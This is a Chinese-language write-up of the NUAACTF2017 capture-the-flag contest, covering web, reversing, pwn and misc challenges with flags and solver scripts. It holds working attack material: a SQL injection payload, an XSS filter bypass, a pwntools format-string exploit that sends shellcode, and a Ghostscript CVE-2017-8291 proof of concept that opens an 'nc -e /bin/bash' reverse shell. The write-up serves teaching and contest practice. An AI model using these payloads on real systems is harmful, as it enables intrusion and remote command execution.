# NUAACTF2017 WriteUp

## 0x00 WEB

### web50

右键查看网页源代码，看到一段被html注释掉的内容，找到flag **nuaactf{buddha_b1ess_us_n0_bug_233}**

### web100

考查 源码泄露，SQL注入

步骤 找到.bak备份文件打开，Ctrl+F搜索flag定位到关键代码
```
$sql = "SELECT `admin` FROM `users` WHERE `username` = '{$_SESSION['user']}' LIMIT 1";
        $res = $db->query($sql);
        $admin = intval($res->fetch_assoc()['admin']);
        if ($admin === 1) {
            echo '<div>Flag: <pre>' . FLAG . '</pre></div>';
```
显然 **$_SESSION['user']** 是注入点，并且可以通过注册任意用户名来控制，然后就可以为所欲为了。 

由于过滤不严格，只要使查询语句返回1就可以爆出flag，参考payload: **me' and 1=0 union select 1#**

flag: **nuaactf{do_!_B_anxious_MY_friend.}**

### web150

题目循环检测alert并删除，试了各种编码无效，想到jsfuck编码可以被js执行，成功绕过。

![](http://oxm4hc2s3.bkt.clouddn.com/3.png)

当然要先闭合前边的引号，后边可以闭合或直接注释掉。

flag: **nuaactf{3a5y_xSS_23333_66666}**

### web200

打开页面发现页面跳转到 **?file=flag** ，并显示
```
nuaactf{this_is_the_fake_flag} 

Sorry, this is not the real flag.
```
这题虽然200分，入手点还是有很多的。

1. 尝试修改查询字符串为flag.php(随便修改)，会报错
```
require_once(): Failed opening required 'flag.php.php'
```
说明原本查询的文件为flag.php，注意，require_once()，对于符合PHP语法的语句，会被包含进index.php并解析，不符合的将直接以文本形式显示。

2. 或者删去查询字符串，执行
```
curl "http://localhost/www/index.php"
```
发现原页面内容为空，显然?file=flag影响了页面显示，也就是说flag这个文件是存在的，猜想flag文件有一部分没有显示出来。

3. 最后用php://filter/read=convert.base64-encode/resource=flag即可显示文件内容，只需再base64解码即可。

### web300

这就是这次比赛最开心的一道题了，进去之后发现正则匹配对输入进行了过滤，'[^\\[\\]\\!\\+]+/g'，也就是说只能使用 **[]!+** 四个字符进行构造，想到jsfuck， **eval(eval(input) + \'(1)\')** ，综合题意，只要可以使用eval(input)构造出'alert'字符串即可。

get到jsfuck的编码方式，就解开了本题。记录如下：

```jsfuck
以下内容基于
[]      =>  []

然后!可以将原类型转化为布尔型
![]     =>  false
!![]    =>  true

+可以将原类型转化为整形
+[]     =>  0
+![]    =>  0
+!![]   =>  1
然后可以推出所有数字 

然后+[]可以转化为字符串
[]+[]   =>  ""
![]+[]  =>  "false"
或放在前边
[]+![]  =>  "false"
+[]+[]  =>  "0"

加括号试试
([]+![])  =>  "false"
[[]+![]]  =>  ["false"]
(+[]+[])  =>  "0"
[+[]+[]]  =>  ["0"]

可以类似数组取下标
(![]+[])[+!![]] =>  'a'

然后就可以从'false', 'true'中依次读出'a','l','e','r','t'。em...但是题目过滤了小括号。需要稍微绕一下，考虑使用中括号
[[]+![]]    =>  ["false"]
[![]+[]][+[]]    =>  "false"
[![]+[]][+[]][+!![]]    =>  'a'

成功

最后用加号拼出"alert"即可。
```

![](http://oxm4hc2s3.bkt.clouddn.com/2.png)

flag: nuaactf{NOT_the_jsF**k_at_a11}

## 0x01 REV

## pychon

#### **【原理】**  文件头魔数，.pyc反编译

首先看后缀，是一个.pyc文件。由于pyc文件我们自己不好运行，于是可以直接丢当网上反编译一下:
[http://tool.lu/pyc/](http://tool.lu/pyc/)
![](res/rev0_0.png)
这种完全无法编译的原因，一般都是因为头部开始就解析错误。

```
RuntimeError: Bad magic number in .pyc file
```
然后上网查看这个文件格式的magic number到底是个啥，再stackoverflow上能够找到一个:
[http://www.jianshu.com/p/03d81eb9ac9b](http://www.jianshu.com/p/03d81eb9ac9b)
首先magic number的解释是
`The magic number comes from UNIX-type systems where the first few bytes of a file held a marker indicating the file type.`
也就是说，这个magic number是.pyc文件的标识符，如果开头不为那个固定的格式的话，就不能解析这个文件。
pyc开头固定四个字节为:
```
xx xx 0d 0a
```
xx依据版本号不同而不同，这里我们使用任何一个能够看到二进制的编辑器打开，能够看到:
```
16 0d 01 0a
```
显然有一位错误了，我们把其改成
```
16 0d 0d 0a 
```
然后运行，发现没有结果（当然，我这边用的是python3.5，如果使用了不同的版本的同学应该还是发生这个错误），然后再次丢当网上反编译一下，得到:
```
#!/usr/bin/env python
# encoding: utf-8
# 访问 http://tool.lu/pyc/ 查看更多信息
if __name__ == '__main__':
    str0 = [81,91,52,76,53,72,88,57,60,85,60,56,88,64,112,74]
    str1 = [1,2,3,4,5,6,7,8,9,10,9,8,7,6,5,4]
    ans = ''
    for (i, j) in zip(str0, str1):
ans += chr(i ^ j)
    
    flag = 'nuaactf{%s}' % ans

```
发现没有输出，自己执行一遍程序得到答案。


## b1nary

#### **【原理】** .exe文件逆向分析

首先打开，发现似乎不能IDA F5大法，于是直接查看代码逻辑:
![](/res/rev2_2.png)
关键的逻辑就是这段，将input和edx为基址的变量进行亦或，如果xor不为0的话，那么会比较esi中的值
![](/res/rev2_3.png)
如果不相等的话会输出"Well down!"，否则的话输出failed
于是思路就是将两个地址中的数据想亦或，就能得到答案:
![](/res/rev2_4.png)
这里提一下，由于是C++中的string类型，所以会在程序开始的时候才进行初始化，也就是说，上述的地址只有在动态调试的时候才能够见的到。
最后写一个简单的脚本:
```
t1 = "Mht!^okHGfdCbn!@4t>"
t2 = [26,13,85,98,17,2,88,23,117,57,42,54,86,15,66,52,82,69]
for i,j in zip(t1,t2):
    print(chr(ord(i)^j),end = '')

# We!COm3_2_Nu4actf1
```

## robots

#### **【原理】** app逆向分析，elf文件逆向分析，数据库文件查看

发现是一个app，下载下来看一看:
![](res/rev1_0.jpg)
看到是一个输入框，然后如果随便输入的话，会显示
```
Ennnnnn........No.Right...
```
我们拿出jeb进行简单的分析，找到里面一个关键的逻辑:
```java
public void onClick(View arg4) {
        if(this.c.check(this.getSecret(this.userEdit.getText().toString()), ((Context)this))) {
            this.tv.setText("Well done!");
        }
        else {
            this.tv.setText("Ennnnnn........No.Right...");
        }
    }
```
这里的调用过程调用了一个叫做c.check的方法，顺着找进去
```java
 CheckAns() {
        super();
        this.name = "aGVsbG8=";
    }

    public boolean check(String arg9, Context arg10) {
        boolean v5 = false;
        Cursor v0 = new SQLAm().openDatabase(arg10).rawQuery("SELECT * FROM user1 WHERE name=\'" + CheckAns.md5(new String(Base64.decode(this.name, 0))) + "\'", null);
        v0.moveToNext();
        String v4 = v0.getString(v0.getColumnIndex("secret"));
        if(arg9.length() == 20 && (v4.equals(arg9))) {
            v5 = true;
        }

        return v5;
    }
```
大致就是说用打开了一个sqlite的数据库，并且再其中取出了当前name的md5值对应的那个数据。
我们可以看到，name是一个base64编码过的数据，然后将其解码后md5，得到的数值为:
```
5d41402abc4b2a76b9719d911017c592
```
然后我们解开当前的apk，可以看到里面再asset里面有一个叫做test的文件，其即为我们的数据库。我们打开数据库，能够看到里面的数据为:
![](res/rev1_1.png)
然后取出我们查找的字符串:
```
kEvKc|roAkNADgGExUeq
```
这个长的也不像flag啊。。然而可以注意到，再一开始的时候，我们再取得字符串之前有一个getSecret的函数，这个函数在哪里呢？
```java
public native String getSecret(String arg1) {
}
```
也就是说，这个函数是写在.so文件中的，我们找到其中一个.so文件，反编译一下:
![](res/rev1_2.png)
找到这个函数之后，理清楚一下逻辑:
程序里面存开始就放了要给字符串数组:
![](res/rev1_3.png)
接下来分析逻辑
首先我们会往dest数组中存入数组下标
[0-0x44]
然后会把当前的数组的数字向后循环移动16
```
  for ( i = 0; ; ++i )
  {
    i_1 = i;
    v3 = getLength(&static_ptr);
    if ( i_1 >= v3 )
      break;
    v27 = dest[i] + 16;
    v26 = getLength(&static_ptr);
    dest[i] = v27 % v26;
  }
```
接下来的逻辑可以理解成：
将当前的inputstr和之前存入的static_str作比较，如果相等的话，使用dest数组中映射过的下标替换当前的字符串。
最后还有一段加密的逻辑：
```
  for ( l = 0; ; ++l )
  {
    v17 = l;
    v6 = getLength(&input_ptr);
    if ( v17 >= v6 )
      break;
    v16 = (_BYTE *)getChar(&input_ptr, l);
    v15 = (char)(l ^ *v16) % -128;
    v14 = (_BYTE *)getChar(&input_ptr, l);
    *v14 = v15;
  }
```
替换过的字符串还要和当前下标异或，得到的字母%128（不过一般是不会超过128的）。最后输入处理完之后要得到我们从数据库里面拿出来的字符串:`kEvKc|roAkNADgGExUeq`
那么我们剩下的操作大致就可以知道了:利用脚本将偏移后的字符串重新移位回去即可；
```python
static_str = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!{|}~'
now = 'kEvKc|roAkNADgGExUeq'
for i,each in enumerate(now):
    tmp = chr(ord(each)^i%128)
    index = static_str.find(tmp)
    if index < 16:
        index = index + len(static_str)
    print(static_str[index-16],end ='')
```
得到答案为:
```
4ndr0id1s!ntr3st1ng!
```

## nuaactf

#### **【原理】** .jar 文件反编译, 爆破

这个程序是一个jar文件，要用java环境才能运行。初步运行之后逻辑如下:
![](res/rev3_2.png)
发现是要我们输入一个字符串作为key。然后我们使用jd-gui观察一下逻辑:
![](res/rev3_1.png)
发现里面把一个叫做Nazo的类叫做encode，作为加密函数，我们看到加密函数本身非常复杂，但是有几处奇怪的数字:
```
int a = 1732584193;
int b = -271733879;
int c = -1732584194;
int d = 271733878;
int e = -1009589776;
```
这些数字是用来做什么的呢？百度一下之后能够发现，这些数字都是SHA1加密的时候用到的数字，然后最后有一个逻辑便是将这个SHA1映射后的数据进行比较的逻辑。那么此时我们先猜测这个数据是啥:
```java
 if (in.length() != 4) {
      throw new Exception("INCORRECT KEY");
    }
```
这里可以看出，输入字符串的长度为4，那么我们进行爆破:
```
import hashlib, string

def findSha1():
    for i in string.printable:
        for j in string.printable:
            for k in string.printable:
                for l in string.printable:
                    if hashlib.sha1((i+j+k+l).encode('utf-8')).hexdigest() == "caf4cbafdf72ce0f2f2eadc4309916e8c96f0de8":
                        print(i+j+k+l)
                        return i+j+k+l

        print(i+j+k+l)

if __name__ == '__main__':
    print("find key {}".format(findSha1()))

```
得到key为mdzz。。。好吧，然后我们继续查看逻辑:
```java
if (Check.checkPassword(password))
{
  a = a14b64a0683594003b4efe8a2285acd8.getInstance();
  a.code = t;
  Object clazz = a.loadClass("com.company.Stage");
  Method c = ((Class)clazz).getMethod("Start", new Class[] { new String().getClass() });
  c.invoke(((Class)clazz).newInstance(), new Object[] { t });
}
```
这一段是java的载入过程的调用，就相当于是手动读入一个java的class，然后去调用这个class。然后我们跟入这个看起来很奇怪的类里面，发现里面重载了findClass这个函数:
![](res/rev3_3.png)
从这个函数的大致内容可以看出来，过程就是:

 * 将我们传入参数中的最后一个类的名字，也就是当前类的名字取出来
 * 将这个名字md5处理一下，然后重新形成新的包的名字
 * 接下来将当前的包读入，进行AES解密，其中iv为"****************"，key为我们之前爆破的内容。
 * 最后将类返回

既然知道了逻辑，我们就将当前的所有.class解密一下
(仅为参考代码)
```java
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

/**
 * Created by link on 2017/10/1.
 */
public class Decode {
    private static String code = "mdzz";

    public static String md5(String string)
    {
        if (string.isEmpty()) {
            return "";
        }
        MessageDigest md5 = null;
        try
        {
            md5 = MessageDigest.getInstance("MD5");
            byte[] bytes = md5.digest(string.getBytes());
            String result = "";
            for (byte b : bytes)
            {
                String temp = Integer.toHexString(b & 0xFF);
                if (temp.length() == 1) {
                    temp = "0" + temp;
                }
                result = result + temp;
            }
            return result;
        }
        catch (NoSuchAlgorithmException e)
        {
            e.printStackTrace();
        }
        return "";
    }

    public static void decodeClass(String name)
    {
        // File file = new File(name);
        InputStream in = null;
        FileOutputStream out = null;
        try {
            in = new FileInputStream(name);
            out = new FileOutputStream(name + "_decode.class");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        long len = 0L;
        try
        {
            len = in.available();
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
        byte[] raw = new byte[(int)len];
        int off = 0;int rst = 0;
        try
        {
            for (;;)
            {
                rst = in.read(raw, off, (int)len);
                if (rst == len) {
                    break;
                }
                off += rst;
                len -= rst;
            }
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
        String ivStr = "****************";
        MessageDigest md = null;
        try
        {
            md = MessageDigest.getInstance("MD5");
        }
        catch (NoSuchAlgorithmException e)
        {
            e.printStackTrace();
        }
        assert (md != null);
        md.update(code.getBytes());
        byte[] key = md.digest();
        Cipher AES = null;
        try
        {
            AES = Cipher.getInstance("AES/CBC/PKCS5Padding");
        }
        catch (NoSuchAlgorithmException e)
        {
            e.printStackTrace();
        }
        catch (NoSuchPaddingException e)
        {
            e.printStackTrace();
        }
        SecretKeySpec spec = new SecretKeySpec(key, "AES");
        IvParameterSpec iv = new IvParameterSpec(ivStr.getBytes());
        try
        {
            assert (AES != null);
            AES.init(2, spec, iv);
        }
        catch (InvalidAlgorithmParameterException e)
        {
            e.printStackTrace();
        }
        catch (InvalidKeyException e)
        {
            e.printStackTrace();
        }
        byte[] en = null;
        try
        {
            en = AES.doFinal(raw);
        }
        catch (BadPaddingException e)
        {
            e.printStackTrace();
        }
        catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        }
        try {
            out.write(en);
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
    public static void main(String argv[]){
        String filename = FilePath;
        for(int i = 2; i <= 8; i++){
            decodeClass(filename + md5(String.format("Stage%d", i)) + ".class");
        }
        return ;
    }
}
```
解密之后，重新查看各个类。可以看到，首先是进入了Stage.class里面查看函数:
```java
  try
    {
      clazz = this.step.loadClass("com.company.Stage2");
    }
    catch (ClassNotFoundException e)
    {
      e.printStackTrace();
    }
    Method c = null;
    byte[] ans = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
        try
    {
      c = clazz.getMethod("check", new Class[] { new byte[0].getClass() });
    }
    catch (NoSuchMethodException e)
    {
      e.printStackTrace();
    }
    try
    {
      ans = (byte[])c.invoke(null, new Object[] { flag.getBytes() });
    }
```
看到这里调用了Stage2类,并且再后面调用了check函数，我们继续跟踪,然后发现大概内容和Stage一样，只不过这一次调用了Stage5，并且有函数:
```java
    for (int i = 0; i < flag.length; i++) {
      if (i % 3 == 0) {
        flag[i] = ((byte)(flag[i] ^ 0x6));
      }
    }
```
这里把%3 == 0的下标对用的数据都进行了^0x6
Stage5中调用了Stage7，其中的加密逻辑则是如下:
```java
    for (int i = 0; i < flag.length; i++) {
      if ((i + 2) % 3 == 0) {
        flag[i] = ((byte)(flag[i] ^ 0x33));
      }
    }
```
Stage7中却没有任何加密，直接返回了flag。

Stage类最后还有一段比较内容:
```java
byte[] checkflag = { 100, 106, 55, 53, 80, 48, 66, 0, 95, 81, 2, 55, 110, 108, 67, 54, 119, 51 };
    for (int i = 0; i < checkflag.length; i++) {
      if (checkflag[i] != ans[i])
      {
        System.out.println("Oh, what a pity~");
        return;
      }
    }
    System.out.printf("Congratulation! flag is nuaactf{%s}", new Object[] { flag });
  }
```
那么显然我们的的flag已经呼之欲出了:
```python
for i,j in enumerate( checkflag):
    if i %3 == 0:
        print(chr(checkflag[i]^0x6),end = '')
    elif (i+2) % 3 == 0:
        print(chr(checkflag[i]^0x33),end ='')
    else:
        print(chr(checkflag[i]),end ='')

```
得到flag为：
```
bY73c0D3_W17h_C0D3
```

## 0x02 PWN

## string
#### **【原理】** 格式化字符串漏洞利用

首先运行string.bin,可以看到运行结果是一个mud game：
![](res/pwn1_0.png)
大概玩了一下，发现这个游戏似乎只能死亡？每次到最后，龙都会直接把你打爆，然后gg。于是我们用IDA看一下大致逻辑:
```C
  if ( strlen(&s) <= 0xC )
  {
    puts("Creating a new player.");
    atHotel();
    findHole();
    meetDragon((_DWORD *)a1);
  }
  else
  {
    puts("Hei! What's up!");
  }
```
其中，`atHotel`就是故意用来坑人的（？），里面并没有什么有价值的漏洞，然而在`findHole`这个函数里面我们能看到:
```C
  if ( v1 == 1 )
  {
    puts("A voice heard in your mind");
    puts("'Give me an address'");
    __isoc99_scanf("%ld", &v2);
    puts("And, you wish is:");
    __isoc99_scanf("%s", &format);
    puts("Your wish is");
    printf(&format, &format);
    puts("I hear it, I hear it....");
  }
```
这个printf函数被IDA翻译除了点问题，如果看汇编的话会发现，此处就是printf(&format),这就是一个典型的printf格式化字符串漏洞！然后我们顺着看之后的逻辑，在`meetDragon`函数里面，有以下内容:
```C
  result = (unsigned int)a1[1];
  if ( *a1 == (_DWORD)result )
  {
    puts("Wizard: I will help you! USE YOU SPELL");
    v2 = (__int64 (__fastcall *)(_QWORD, void *))mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
    buf = v2;
    v4 = v2;
    read(0, v2, 0x100uLL);
    result = buf(0LL, v4);
  }
```
这里会发现，程序用mmap申请了一段**可读可写可执行的**空间，并且读入我们输入的内容，最后跳转上去执行。这个就是**典型的插入shellcode的位置**。（其实根据游戏剧情这里也提到了，巫师说【"I will help you! USE YOU SPELL"】，相当于是一种暗示。）shellcode就是一段简单的字节码，这里的shellcode能够完成提权攻击，可以利用pwntools或者上网查找都可以。

为了触发这个跳转，要实现a1[1] = result。这样看起来有点模糊，回溯这个a1的来源，我们能够在main函数看到:
```C
  v4 = malloc(8uLL);
  v5 = (__int64)v4;
  *v4 = 0x44;
  v4[1] = 0x55;
  printf("secret[0] is %x\n", v5, argv);
  printf("secret[1] is %x\n", v5 + 4);
  puts("do not tell anyone ");
  beginStory(v5);
```
这里的v4是一个堆上的地址，v4相当于是一个数组；然后这个游戏在一开始的时候就把堆的地址输出来了，并且让v4[0]和v4[1]的值分别赋予了两个不同的值。那么也就是说，只要这两个值相等，那么之前在`meetDragon`函数位置上的a1和result就能够相等，然后触发巫师过来帮忙让你输入shellcode的情节。

现在我们能够找到的漏洞就是这个printf格式化字符串漏洞。这个漏洞的成因就是【因为直接将printf的第一个参数让其可以输出】。举一个例子来说:
```
printf("%d",a);
```
这个表达式能够将a中的数据当作整数输出，【不管a是不是真的是int类型的变量】。那么，如果这个`"%d"`字符串是由我们来控制输入的话:
```
char input[20];
scanf("%s",input); // 此时输入%x,%x
printf(input,a);
```
那么显然，这里只有一个参数a，第二个%x就会【强行从printf中的第三个参数的位置上的数据读出并且进行显示】（为什么是第三个参数？这里需要知道printf函数调用的过程，具体就不细讲了，自己了解即可）。我们结合栈的图来看:
![](res/pwn1_1.png)
如上图，相当于是如下的情况:
```C
printf("%d %d %d",a,b,c);
```
也就是说，printf自己会维护一个栈指针，指向下一个栈中需要被输出的值的位置。然后，如果说，我们此时不传入c的话，栈指针是不知道的，它依然会移动到当前位置上，并且将这个位置上的值进行输出。
然后，对于格式化字符串，除了大家常见的%s,%x,%d等，有一个叫做**%n**的格式，它的功能是【将之前输出的字符串长度的总长写到指定的参数位置上】。举个例子来说:
```C
printf("123456%n", &a);
printf("a = %d",a);
```
那么此时，a的值就为6。为什么要传入a的地址？这个是因为%n的作用原理和%s类似，都是将当前的变量作为**指针**，写入指针所指向的地址。
知道了这个%n的功能，还知道了格式化字符串漏洞，那么我们这里就要想着，如何让a1[1] = result(a1[0])了。我们知道，这两个值的**【地址】**已经被泄露出来了。那么，如果我们**【把这个地址放到栈中的某个位置，然后利用%n，就能够往指定位置上写入指定的数字】**。大致格式图如下:
![](res/pwn1_2.png)
那么我们观察，有没有机会存入地址:
```C
    puts("A voice heard in your mind");
    puts("'Give me an address'");
    __isoc99_scanf("%ld", &v2);
    puts("And, you wish is:");
    __isoc99_scanf("%s", &format);
    puts("Your wish is");
```
回想上面这段代码，能够发现，v2处居然有输入整数的过程，而且很巧，这个整数【也放在栈上】，那么我们不久可以通过往这个整数变量中【写入我们要存放的a[1]的地址】，然后构造合理的输入字符串，完成往【a[1]中存放指定数值】的操作！

这里还要提到一个小技巧，比如说，我们此时printf如下:
```C
printf("v2 = %d, v1 = %d", v1, v2);
```
仔细看可以发现，上面的v2和v1写反了，但是如果我们不想改动这两个变脸的位置的话，我们可以使用POSIX标准引入的新的格式化字符串下的`$`符号，用法如下：
```
printf("%2$d %2$#x; %1$d %1$#x",16,17)
// 输出为  17 0x11; 16 0x10
```
也就是说，%n$x表示的是【把第n个参数输出来】。因为我们的整数本身也不一定是正好放在format参数的后面，而且这里的程序是64bit的，64bit传入参数的时候，之前的参数的会放在寄存器中，多余的参数才会放到栈上，传参的顺序为【rdi,rsi,rdx,rcx,r8,r9，栈】。
我们使用gdb调试程序，让其运行到可疑的位置上：
![](res/pwn1_3.png)
我输入的数字为123456，也就是0x1e24。这里能够看到，我们输入的数字被放到了传入参数的第二个位置（为什么？这个是运行时决定的，不具有通用性分析）。那么，此时参数的位置就相当于在【当前传入参数的第7个参数的位置上】，于是我们就能够构造攻击字符串:
```
0000000...00000000%7$n
|---  85 个 0 ---|
```
但是这个000也太多了。。。于是我们想到可以利用格式化字符串的**填充写法**，也就是说:
```
%08x
```
表示的是【输入长度为8的十六进制数，不足8位的时候，高位用0不足】
那么我们最终的攻击字符串就能够写成;
```
0x55*'a' + "%7$hhn"
```
其中%hhn表示的是，要将【输入长度为char类型的转换成int长度】，简单来说就是填充的多一点。。。期间我们还要保证输入的地址为一开始程序泄露出来的堆地址，也就是:
![](res/pwn1_4.png)
这两个地址中的一个。

当然为了保证交互，这里还是得通过使用python的pwntools来完成:
```python
#   -*- coding:utf-8 -*-

from pwn import *

DEBUG = True
if DEBUG:
    ph = process("./string.bin")
    context.log_level = "debug"
    context.terminal= ['tmux','splitw','-h']
        gdb.attach(ph)
else:
    ph = remote("211.65.102.6",20003)
exp = 0x55*'a' + "%7$hhn"
def getAddr():
    ph.recvuntil("secret[0] is")
    sec_addr = int(ph.recvuntil("\n").strip(), 16)
    return sec_addr

def pwn(addr):
    ph.recvuntil("What should your character's name be:")
    ph.sendline("link")
    ph.recvuntil("?east or up?:")
    ph.sendline("east")
    ph.recvuntil("or leave(0)?:")
    ph.sendline("1")
    ph.recvuntil("an address'")
    ph.sendline(str(addr))
    ph.recvuntil("And, you wish is:")
    ph.sendline(exp)
    ph.recvuntil("I will help you! USE YOU SPELL")
    ph.sendline(asm(shellcraft.amd64.linux.sh(), arch='amd64'))


if __name__ == '__main__':
    addr = getAddr()
    pwn(addr)
    ph.interactive()

```

## 0x04 MISC

### ++--

#### **【原理】**

brainfuck, ( ͡° ͜ʖ ͡°)fuck

#### **【目的】**



#### **【环境】**

有浏览器和文本编辑器就行

#### **【工具】**

brainfuck, ( ͡° ͜ʖ ͡°)fuck

#### **【步骤】**

解( ͡° ͜ʖ ͡°)fuck得到brainfuck

参考网址: [( ͡° ͜ʖ ͡°)fuck](https://esolangs.org/wiki/(_%CD%A1%C2%B0_%CD%9C%CA%96_%CD%A1%C2%B0)fuck) 

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>++++++++++.+++++++.--------------------..++.+++++++++++++++++.--------------.+++++++++++++++++++++.-------------------------.++++++++++++++++.<------------------.---.>----.--------.+++++++++++++++.------------------.++++++++.------------.+++++++++++++++++.<.>+++++.--.++++++++++.
```

再解brainfuck得到flag

参考网址: [brainfuck interpreter](https://sange.fi/esoteric/brainfuck/impl/interp/i.html)

#### **【总结】**

### traffic

#### **【原理】**

usb流量分析

#### **【目的】**



#### **【环境】**

推荐: Kali,Python2.7

#### **【工具】**

[UsbMiceDataHacker](https://github.com/WangYihang/UsbMiceDataHacker)

#### **【步骤】**

需要安装numpy,matplotlib包，在GitHub上的README中有详细教程。

![1](misc/traffic/files_for_writeup/1.png)

![2](misc/traffic/files_for_writeup/2.png)

#### **【总结】**
### recover
#### **【原理】**



#### **【目的】**



#### **【环境】**

Python 

#### **【工具】**

<del>pngcheck, 010 editor</del> PCRT

#### **【步骤】**

首先修复png头部，然后发现IHDR的crc校验未通过，直接修改crc为正确值可以看到图片，但是没有flag。

这时候有两种情况，图片高度或宽度，既然正常显示说明宽度没问题，调整图片高度或者爆破高度得到正确高度为1500，得到flag。

我在按照学长方法试的时候发现了另外一种方法...

有一款可以一款自动化检测修复PNG损坏的取证工具: [PCRT](https://github.com/sherlly/PCRT) 

用法在README中...

![](misc/recover/files_for_writeup/MISC-recover-PCRT.png)

然后就能在output.png中看到flag了

![](misc/recover/files_for_writeup/original.png)

#### **【总结】**

### pillow

#### **【原理】**

Python PIL Module Command Execution Vulnerability

PIL 在对 eps 图片格式进行处理的时候，如果环境内装有 GhostScript，则会调用 GhostScript 在 dSAFER 模式下处理图片，即使是最新版本的PIL模块，也会受到 `GhostButt CVE-2017-8291` dSAFER 模式 Bypass 漏洞的影响，产生命令执行漏洞。

GhostButt CVE-2017-8291

具体漏洞细节参照以下文章：

https://paper.seebug.org/405/

https://xianzhi.aliyun.com/forum/read/2163.html

#### **【目的】**

#### **【环境】**

#### **【工具】**

#### **【步骤】**

上传带payload的png，payload为`nc -e /bin/bash <IP> <PORT>`，然后在vps上`nc -l -p <PORT>`得到reverse shell。

flag在web目录下，ls可以看到。

![1](files_for_writeup/1.png)

##### PoC

```python
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

/size_from  10000      def
/size_step    500      def
/size_to   65000      def
/enlarge    1000      def

%/bigarr 65000 array def

0
size_from size_step size_to {
    pop
    1 add
} for

/buffercount exch def

/buffersizes buffercount array def

0
size_from size_step size_to {
    buffersizes exch 2 index exch put
    1 add
} for
pop

/buffers buffercount array def

0 1 buffercount 1 sub {
    /ind exch def
    buffersizes ind get /cursize exch def
    cursize string /curbuf exch def
    buffers ind curbuf put
    cursize 16 sub 1 cursize 1 sub {
        curbuf exch 255 put
    } for
} for

/buffersearchvars [0 0 0 0 0] def
/sdevice [0] def

enlarge array aload

{
    .eqproc
    buffersearchvars 0 buffersearchvars 0 get 1 add put
    buffersearchvars 1 0 put
    buffersearchvars 2 0 put
    buffercount {
        buffers buffersearchvars 1 get get
        buffersizes buffersearchvars 1 get get
        16 sub get
        254 le {
            buffersearchvars 2 1 put
            buffersearchvars 3 buffers buffersearchvars 1 get get put
            buffersearchvars 4 buffersizes buffersearchvars 1 get get 16 sub put
        } if
        buffersearchvars 1 buffersearchvars 1 get 1 add put
    } repeat

    buffersearchvars 2 get 1 ge {
        exit
    } if
    %(.) print
} loop

.eqproc
.eqproc
.eqproc
sdevice 0
currentdevice
buffersearchvars 3 get buffersearchvars 4 get 16#7e put
buffersearchvars 3 get buffersearchvars 4 get 1 add 16#12 put
buffersearchvars 3 get buffersearchvars 4 get 5 add 16#ff put
put

buffersearchvars 0 get array aload

sdevice 0 get
16#3e8 0 put

sdevice 0 get
16#3b0 0 put

sdevice 0 get
16#3f0 0 put

currentdevice null false mark /OutputFile (%pipe%nc -e /bin/bash <ip> <port>)
.putdeviceparams
1 true .outputpage
.rsdparams
%{ } loop
0 0 .quit
%asdf
```



#### 【总结】**

